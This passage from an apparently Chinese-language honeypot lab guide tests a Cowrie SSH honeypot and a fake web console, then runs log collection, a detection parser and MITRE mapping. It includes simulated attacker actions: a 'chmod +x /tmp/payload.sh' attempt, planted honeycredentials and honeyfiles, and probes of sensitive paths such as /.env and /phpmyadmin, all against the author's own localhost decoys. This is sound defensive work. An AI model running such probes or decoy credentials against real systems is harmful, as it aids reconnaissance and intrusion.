backup@svr04:~$ chmod +x /tmp/payload.sh
chmod: cannot access '/tmp/payload.sh': No such file or directory
backup@svr04:~$ exit
Connection to 127.0.0.1 closed.
lss@lss:/opt/deception-lab $
```

### Step 11.9：測試 Web 登入失敗
- 在 Raspberry Pi 上執行：
```
curl -s -X POST http://127.0.0.1:8080/login \
  -d "username=admin" \
  -d "password=wrongpassword" \
  -o /tmp/web-login-failed.html
```
- 確認有產生登入事件：
```
tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl

# 你應該看到："honeycredential_used": false

# 執行結果：
lss@lss:/opt/deception-lab $ curl -s -X POST http://127.0.0.1:8080/login \
  -d "username=admin" \
  -d "password=wrongpassword" \
  -o /tmp/web-login-failed.html
lss@lss:/opt/deception-lab $ tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl
{"timestamp": "2026-05-11T21:46:56.695098+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "192.168.1.1", "username": "admin", "password_sha256": "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92", "password_length": 6, "honeycredential_used": false, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "severity": "medium", "tags": ["web", "login"]}
{"timestamp": "2026-05-11T22:18:07.651474+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "192.168.1.1", "username": "backup", "password_sha256": "0ecba7213823d57d8b9c6510186aa9ba9e401b2f4508e792f8f3ca4aec6394e1", "password_length": 12, "honeycredential_used": false, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "severity": "medium", "tags": ["web", "login"]}
{"timestamp": "2026-05-12T18:36:26.543366+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
{"timestamp": "2026-05-12T18:41:52.679019+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
{"timestamp": "2026-05-21T20:10:34.117443+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "admin", "password_sha256": "8ecd67dceb90a898b1f94bddf570ce1c23629cd328140d81f1e02e43d42eb44e", "password_length": 13, "honeycredential_used": false, "user_agent": "curl/8.14.1", "severity": "medium", "tags": ["web", "login"]}
```

### Step 11.10：測試 Web honeycredential 使用
- 執行：
```
curl -s -X POST http://127.0.0.1:8080/login \
  -d "username=backup" \
  -d "password=Backup2026!" \
  -o /tmp/web-login-honeycredential.html

# 確認是否回到 dashboard：
grep -E "Dashboard|Authentication accepted" /tmp/web-login-honeycredential.html

# 查看 auth log：
tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl

# 你應該看到：
"honeycredential_used": true

# 這會被 parser 偵測成：
WEB_HONEYCREDENTIAL_USED

# 執行結果：
lss@lss:/opt/deception-lab $ curl -s -X POST http://127.0.0.1:8080/login \
  -d "username=backup" \
  -d "password=Backup2026!" \
  -o /tmp/web-login-honeycredential.html
lss@lss:/opt/deception-lab $ grep -E "Dashboard|Authentication accepted" /tmp/web-login-honeycredential.html
  <title>Dashboard - Internal Device Management Console</title>
    <h1>Device Management Dashboard</h1>
    <div class="warning">Authentication accepted. Some modules are temporarily unavailable.</div>
lss@lss:/opt/deception-lab $ tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl
{"timestamp": "2026-05-11T22:18:07.651474+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "192.168.1.1", "username": "backup", "password_sha256": "0ecba7213823d57d8b9c6510186aa9ba9e401b2f4508e792f8f3ca4aec6394e1", "password_length": 12, "honeycredential_used": false, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "severity": "medium", "tags": ["web", "login"]}
{"timestamp": "2026-05-12T18:36:26.543366+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
{"timestamp": "2026-05-12T18:41:52.679019+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
{"timestamp": "2026-05-21T20:10:34.117443+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "admin", "password_sha256": "8ecd67dceb90a898b1f94bddf570ce1c23629cd328140d81f1e02e43d42eb44e", "password_length": 13, "honeycredential_used": false, "user_agent": "curl/8.14.1", "severity": "medium", "tags": ["web", "login"]}
{"timestamp": "2026-05-21T20:13:55.354969+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
```
- 確認Step 11.10：測試 Web honeycredential 使用結果
```
確認：Step 11.10 測試 Web honeycredential 使用成功。
你這次測試用了：
username=backup
password=Backup2026!
結果分成兩個部分確認。
# 1. Web 頁面回應成功
grep -E "Dashboard|Authentication accepted" /tmp/web-login-honeycredential.html
--------------
lss@lss:/opt/deception-lab $ grep -E "Dashboard|Authentication accepted" /tmp/web-login-honeycredential.html
  <title>Dashboard - Internal Device Management Console</title>
    <h1>Device Management Dashboard</h1>
    <div class="warning">Authentication accepted. Some modules are temporarily unavailable.</div>
看到：<HTML>
這代表 Fake Web 已經接受這組 honeycredential，並回傳 Dashboard 頁面。
所以：
backup / Backup2026!
已成功觸發 fake admin login。

# 2. Web auth log 成功記錄 honeycredential
你的最後一筆 log 是：JSON
"username": "backup",
"honeycredential_used": true,
"severity": "high",
"tags": ["web", "login", "honeycredential"]
這代表系統已正確判定：
backup / Backup2026! 是 honeycredential
而且事件嚴重度也正確標成：high
```

### Step 11.11：測試 Web honeyfile 下載
- 執行：
```
curl -s http://127.0.0.1:8080/download/secrets.txt -o /tmp/secrets.txt
curl -s http://127.0.0.1:8080/download/backup_config.ini -o /tmp/backup_config.ini
curl -s http://127.0.0.1:8080/download/database_passwords.txt -o /tmp/database_passwords.txt
```
- 查看下載內容：
```
head -n 10 /tmp/secrets.txt
head -n 10 /tmp/backup_config.ini
head -n 10 /tmp/database_passwords.txt

# 執行結果：
lss@lss:/opt/deception-lab $ curl -s http://127.0.0.1:8080/download/secrets.txt -o /tmp/secrets.txt
lss@lss:/opt/deception-lab $ curl -s http://127.0.0.1:8080/download/backup_config.ini -o /tmp/backup_config.ini
lss@lss:/opt/deception-lab $ curl -s http://127.0.0.1:8080/download/database_passwords.txt -o /tmp/database_passwords.txt
lss@lss:/opt/deception-lab $ head -n 10 /tmp/secrets.txt
Internal Secret Notes

Do not distribute.

Temporary accounts:
admin / Admin@12345
backup / Backup2026!
operator / P@ssw0rd!

Legacy VPN account:
lss@lss:/opt/deception-lab $ head -n 10 /tmp/backup_config.ini
[backup-server]
host=192.0.2.20
username=backup
password=Backup2026!
schedule=02:00

[database]
host=192.0.2.30
username=dbadmin
password=ChangeMe_2026!
lss@lss:/opt/deception-lab $ head -n 10 /tmp/database_passwords.txt
Database Credential Backup

db-main:
host=192.0.2.30
username=dbadmin
password=ChangeMe_2026!

db-report:
host=192.0.2.31
username=report
```
- 刪除本機測試下載檔：
```
rm -f /tmp/secrets.txt /tmp/backup_config.ini /tmp/database_passwords.txt
```
- 查看 access log：
```
tail -n 10 /opt/deception-lab/data/logs/web/web_access.jsonl

# 你應該看到：
"event_type": "web_honeyfile_access"

# 這會被 parser 偵測成：
WEB_HONEYFILE_ACCESS

# 執行結果：
lss@lss:/opt/deception-lab $ tail -n 10 /opt/deception-lab/data/logs/web/web_access.jsonl
{"timestamp": "2026-05-12T18:36:26.542718+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-12T18:41:52.678577+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:10:34.116816+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:13:55.354556+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:22:22.564994+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/secrets.txt", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:22:22.565328+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "secrets.txt", "path": "/download/secrets.txt", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-21T20:22:28.786823+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/backup_config.ini", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:22:28.787061+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "backup_config.ini", "path": "/download/backup_config.ini", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-21T20:22:35.106551+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/database_passwords.txt", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:22:35.106787+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "database_passwords.txt", "path": "/download/database_passwords.txt", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
```

### Step 11.12：測試 Web scanner path 探測
- 執行：
```
curl -I http://127.0.0.1:8080/.env
curl -I http://127.0.0.1:8080/wp-admin
curl -I http://127.0.0.1:8080/phpmyadmin
curl -I http://127.0.0.1:8080/server-status
curl -I http://127.0.0.1:8080/actuator/env

# 執行結果：
lss@lss:/opt/deception-lab $ curl -I http://127.0.0.1:8080/.env
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Fri, 22 May 2026 21:41:34 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 342

lss@lss:/opt/deception-lab $ curl -I http://127.0.0.1:8080/wp-admin
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Fri, 22 May 2026 21:41:50 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 342

lss@lss:/opt/deception-lab $ curl -I http://127.0.0.1:8080/phpmyadmin
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Fri, 22 May 2026 21:42:05 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 342

lss@lss:/opt/deception-lab $ curl -I http://127.0.0.1:8080/server-status
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Fri, 22 May 2026 21:42:11 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 342

lss@lss:/opt/deception-lab $ curl -I http://127.0.0.1:8080/actuator/env
HTTP/1.1 404 NOT FOUND
Server: gunicorn
Date: Fri, 22 May 2026 21:42:18 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 342

# 確認：Step 11.12 的 Web scanner path 探測請求已成功送出。
你測試的 5 個常見掃描路徑都有收到 Fake Web 回應：
/.env
/wp-admin
/phpmyadmin
/server-status
/actuator/env
它們全部回傳：HTTP/1.1 404 NOT FOUND 這是正常結果，不是錯誤。
原因是這些路徑本來就不是實際存在的頁面；我們要測試的不是頁面是否存在，而是 Fake Web 是否能記錄「有人嘗試探測這些敏感路徑」。
```
- 查看 access log：
```
tail -n 20 /opt/deception-lab/data/logs/web/web_access.jsonl

# 你應該看到部分事件包含："is_scanner_probe": true
如果有看到，代表：
[完成] scanner path request 已送出
[完成] Fake Web 已記錄 scanner probe
[完成] 後續 parser 會偵測為 WEB_SCANNER_PROBE

這會被 parser 偵測成：WEB_SCANNER_PROBE

# 目前判定：所以 Step 11.12：測試 Web scanner path 探測結果成功。
[完成] /.env 探測
[完成] /wp-admin 探測
[完成] /phpmyadmin 探測
[完成] /server-status 探測
[完成] /actuator/env 探測
[完成] web_access.jsonl 記錄成功
[完成] is_scanner_probe = true
[完成] tags 包含 scanner-probe
所以 Step 11.12：測試 Web scanner path 探測結果成功。

# 執行結果：
lss@lss:/opt/deception-lab $ tail -n 20 /opt/deception-lab/data/logs/web/web_access.jsonl
{"timestamp": "2026-05-11T21:57:19.330990+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "192.168.1.1", "method": "GET", "path": "/download/vpn_users.csv", "query_string": "", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-11T21:57:19.331247+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "192.168.1.1", "filename": "vpn_users.csv", "path": "/download/vpn_users.csv", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-11T22:10:43.882087+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-11T22:18:07.650530+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "192.168.1.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-11T22:18:07.668441+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "192.168.1.1", "method": "GET", "path": "/static/style.css", "query_string": "", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-12T18:36:26.542718+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-12T18:41:52.678577+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:10:34.116816+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:13:55.354556+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "POST", "path": "/login", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:22:22.564994+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/secrets.txt", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:22:22.565328+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "secrets.txt", "path": "/download/secrets.txt", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-21T20:22:28.786823+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/backup_config.ini", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:22:28.787061+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "backup_config.ini", "path": "/download/backup_config.ini", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-21T20:22:35.106551+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/database_passwords.txt", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-21T20:22:35.106787+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "database_passwords.txt", "path": "/download/database_passwords.txt", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-22T21:41:34.133872+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/.env", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
{"timestamp": "2026-05-22T21:41:50.477889+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/wp-admin", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
{"timestamp": "2026-05-22T21:42:05.980982+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/phpmyadmin", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
{"timestamp": "2026-05-22T21:42:11.462027+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/server-status", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
{"timestamp": "2026-05-22T21:42:18.142043+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/actuator/env", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
```

### Step 11.13：重新收集 log
- 執行：
```
/opt/deception-lab/scripts/collect_logs.sh

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/collect_logs.sh
[+] Collecting logs at UTC time: 20260522T215154Z
[+] Exporting Cowrie Docker logs...
[+] Collecting Fake Web access log...
[+] Collecting Fake Web auth log...
[+] Creating source manifest...
[+] Creating collection summary...
[+] Archiving collected logs...

[+] Collection completed.
[+] Current collected directory:
total 64K
drwxrwxr-x 2 lss lss 4.0K May 15 07:18 .
drwxrwxr-x 9 lss lss 4.0K May 22 03:50 ..
-rw-rw-r-- 1 lss lss  370 May 23 05:51 collection_summary.txt
-rw-rw-r-- 1 lss lss  28K May 23 05:51 cowrie-docker.log
-rw-rw-r-- 1 lss lss  579 May 15 07:18 README.md
-rw-rw-r-- 1 lss lss  777 May 23 05:51 source_manifest.json
-rwxrwxr-x 1 lss lss  11K May 23 05:51 web_access.jsonl
-rwxrwxr-x 1 lss lss 2.5K May 23 05:51 web_auth.jsonl

[+] Summary:
Collection time UTC: 20260522T215154Z

Collected files:

- /opt/deception-lab/data/collected/cowrie-docker.log
  size: 28K
  lines: 220
- /opt/deception-lab/data/collected/web_access.jsonl
  size: 12K
  lines: 32
- /opt/deception-lab/data/collected/web_auth.jsonl
  size: 4.0K
  lines: 6
- /opt/deception-lab/data/collected/source_manifest.json
  size: 4.0K
  lines: 26
```
- 確認 collected log 已刷新：
```
cat /opt/deception-lab/data/collected/collection_summary.txt

# 執行結果：
lss@lss:/opt/deception-lab $ cat /opt/deception-lab/data/collected/collection_summary.txt
Collection time UTC: 20260522T215154Z

Collected files:

- /opt/deception-lab/data/collected/cowrie-docker.log
  size: 28K
  lines: 220
- /opt/deception-lab/data/collected/web_access.jsonl
  size: 12K
  lines: 32
- /opt/deception-lab/data/collected/web_auth.jsonl
  size: 4.0K
  lines: 6
- /opt/deception-lab/data/collected/source_manifest.json
  size: 4.0K
  lines: 26
```

### Step 11.14：重新執行 parser
- 執行：
```
/opt/deception-lab/scripts/run_parser.sh

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/run_parser.sh
[+] Collecting latest logs...
[+] Collecting logs at UTC time: 20260522T215427Z
[+] Exporting Cowrie Docker logs...
[+] Collecting Fake Web access log...
[+] Collecting Fake Web auth log...
[+] Creating source manifest...
[+] Creating collection summary...
[+] Archiving collected logs...

[+] Collection completed.
[+] Current collected directory:
total 64K
drwxrwxr-x 2 lss lss 4.0K May 15 07:18 .
drwxrwxr-x 9 lss lss 4.0K May 22 03:50 ..
-rw-rw-r-- 1 lss lss  370 May 23 05:54 collection_summary.txt
-rw-rw-r-- 1 lss lss  28K May 23 05:54 cowrie-docker.log
-rw-rw-r-- 1 lss lss  579 May 15 07:18 README.md
-rw-rw-r-- 1 lss lss  777 May 23 05:54 source_manifest.json
-rwxrwxr-x 1 lss lss  11K May 23 05:54 web_access.jsonl
-rwxrwxr-x 1 lss lss 2.5K May 23 05:54 web_auth.jsonl

[+] Summary:
Collection time UTC: 20260522T215427Z

Collected files:

- /opt/deception-lab/data/collected/cowrie-docker.log
  size: 28K
  lines: 220
- /opt/deception-lab/data/collected/web_access.jsonl
  size: 12K
  lines: 32
- /opt/deception-lab/data/collected/web_auth.jsonl
  size: 4.0K
  lines: 6
- /opt/deception-lab/data/collected/source_manifest.json
  size: 4.0K
  lines: 26

[+] Running event parser...
[+] Parsing completed.
[+] Events written to: /opt/deception-lab/data/events/events.jsonl
[+] Detections written to: /opt/deception-lab/data/events/detections.jsonl
[+] Summary written to: /opt/deception-lab/data/events/events_summary.json

Total events: 76
Total detections: 38

[+] Event output files:
total 80K
drwxrwxr-x 2 lss lss 4.0K May 21 07:53 .
drwxrwxr-x 9 lss lss 4.0K May 22 03:50 ..
-rw-rw-r-- 1 lss lss 2.9K May 22 03:45 attack_coverage.json
-rw-rw-r-- 1 lss lss  24K May 23 05:54 detections.jsonl
-rw-rw-r-- 1 lss lss 2.2K May 22 03:45 engage_coverage.json
-rw-rw-r-- 1 lss lss  27K May 23 05:54 events.jsonl
-rw-rw-r-- 1 lss lss  753 May 23 05:54 events_summary.json
-rw-rw-r-- 1 lss lss 6.1K May 22 03:45 mapping_summary.json

[+] Event summary:
{
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 3,
    "SSH_HONEYFILE_ACCESS": 6,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 11,
    "SSH_TOOL_TRANSFER_COMMAND": 4,
    "WEB_HONEYCREDENTIAL_USED": 3,
    "WEB_HONEYFILE_ACCESS": 5,
    "WEB_SCANNER_PROBE": 5
  },
  "detections_by_severity": {
    "high": 21,
    "medium": 17
  },
  "events_by_source": {
    "cowrie": 38,
    "fake-web": 38
  },
  "events_by_type": {
    "ssh_command": 27,
    "ssh_connection": 4,
    "ssh_login_failed": 1,
    "ssh_login_success": 3,
    "ssh_logout": 3,
    "web_honeyfile_access": 5,
    "web_login_attempt": 6,
    "web_request": 27
  },
  "generated_at": "2026-05-22T21:54:27.569856+00:00",
  "total_detections": 38,
  "total_events": 76
```
- 查看事件摘要：
```
cat /opt/deception-lab/data/events/events_summary.json | jq

# 你應該會看到：
total_events 增加
total_detections 增加
# 尤其應該要多出：
SSH_TOOL_TRANSFER_COMMAND
WEB_SCANNER_PROBE

# 執行結果：
lss@lss:/opt/deception-lab $ cat /opt/deception-lab/data/events/events_summary.json | jq
{
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 3,
    "SSH_HONEYFILE_ACCESS": 6,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 11,
    "SSH_TOOL_TRANSFER_COMMAND": 4,
    "WEB_HONEYCREDENTIAL_USED": 3,
    "WEB_HONEYFILE_ACCESS": 5,
    "WEB_SCANNER_PROBE": 5
  },
  "detections_by_severity": {
    "high": 21,
    "medium": 17
  },
  "events_by_source": {
    "cowrie": 38,
    "fake-web": 38
  },
  "events_by_type": {
    "ssh_command": 27,
    "ssh_connection": 4,
    "ssh_login_failed": 1,
    "ssh_login_success": 3,
    "ssh_logout": 3,
    "web_honeyfile_access": 5,
    "web_login_attempt": 6,
    "web_request": 27
  },
  "generated_at": "2026-05-22T21:54:27.569856+00:00",
  "total_detections": 38,
  "total_events": 76
```

### Step 11.15：查看 detection rule 命中數
- 執行：
```
grep -o '"rule_id": "[^"]*"' /opt/deception-lab/data/events/detections.jsonl | sort | uniq -c

# 你希望看到類似：
SSH_HONEYCREDENTIAL_LOGIN
SSH_HONEYFILE_ACCESS
SSH_RECON_COMMAND
SSH_TOOL_TRANSFER_COMMAND
WEB_HONEYCREDENTIAL_USED
WEB_HONEYFILE_ACCESS
WEB_SCANNER_PROBE
如果某些沒有出現，通常是因為該情境還沒有產生 log，可以回到對應 Step 重新測試。

# 執行結果：
lss@lss:/opt/deception-lab $ grep -o '"rule_id": "[^"]*"' /opt/deception-lab/data/events/detections.jsonl | sort | uniq -c
      3 "rule_id": "SSH_HONEYCREDENTIAL_LOGIN"
      6 "rule_id": "SSH_HONEYFILE_ACCESS"
      1 "rule_id": "SSH_LOGIN_FAILED"
     11 "rule_id": "SSH_RECON_COMMAND"
      4 "rule_id": "SSH_TOOL_TRANSFER_COMMAND"
      3 "rule_id": "WEB_HONEYCREDENTIAL_USED"
      5 "rule_id": "WEB_HONEYFILE_ACCESS"
      5 "rule_id": "WEB_SCANNER_PROBE"
```

### Step 11.16：重新執行 MITRE mapping
- 執行：
```
/opt/deception-lab/scripts/run_mapping.sh

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/run_mapping.sh
[+] Running parser first to refresh detections...
[+] Collecting latest logs...
[+] Collecting logs at UTC time: 20260522T215859Z
[+] Exporting Cowrie Docker logs...
[+] Collecting Fake Web access log...
[+] Collecting Fake Web auth log...
[+] Creating source manifest...
[+] Creating collection summary...
[+] Archiving collected logs...

[+] Collection completed.
[+] Current collected directory:
total 64K
drwxrwxr-x 2 lss lss 4.0K May 15 07:18 .
drwxrwxr-x 9 lss lss 4.0K May 22 03:50 ..
-rw-rw-r-- 1 lss lss  370 May 23 05:58 collection_summary.txt
-rw-rw-r-- 1 lss lss  28K May 23 05:58 cowrie-docker.log
-rw-rw-r-- 1 lss lss  579 May 15 07:18 README.md
-rw-rw-r-- 1 lss lss  777 May 23 05:58 source_manifest.json
-rwxrwxr-x 1 lss lss  11K May 23 05:58 web_access.jsonl
-rwxrwxr-x 1 lss lss 2.5K May 23 05:58 web_auth.jsonl

[+] Summary:
Collection time UTC: 20260522T215859Z

Collected files:

- /opt/deception-lab/data/collected/cowrie-docker.log
  size: 28K
  lines: 220
- /opt/deception-lab/data/collected/web_access.jsonl
  size: 12K
  lines: 32
- /opt/deception-lab/data/collected/web_auth.jsonl
  size: 4.0K
  lines: 6
- /opt/deception-lab/data/collected/source_manifest.json
  size: 4.0K
  lines: 26

[+] Running event parser...
[+] Parsing completed.
[+] Events written to: /opt/deception-lab/data/events/events.jsonl
[+] Detections written to: /opt/deception-lab/data/events/detections.jsonl
[+] Summary written to: /opt/deception-lab/data/events/events_summary.json

Total events: 76
Total detections: 38

[+] Event output files:
total 80K
drwxrwxr-x 2 lss lss 4.0K May 21 07:53 .
drwxrwxr-x 9 lss lss 4.0K May 22 03:50 ..
-rw-rw-r-- 1 lss lss 2.9K May 22 03:45 attack_coverage.json
-rw-rw-r-- 1 lss lss  24K May 23 05:58 detections.jsonl
-rw-rw-r-- 1 lss lss 2.2K May 22 03:45 engage_coverage.json
-rw-rw-r-- 1 lss lss  27K May 23 05:58 events.jsonl
-rw-rw-r-- 1 lss lss  753 May 23 05:58 events_summary.json
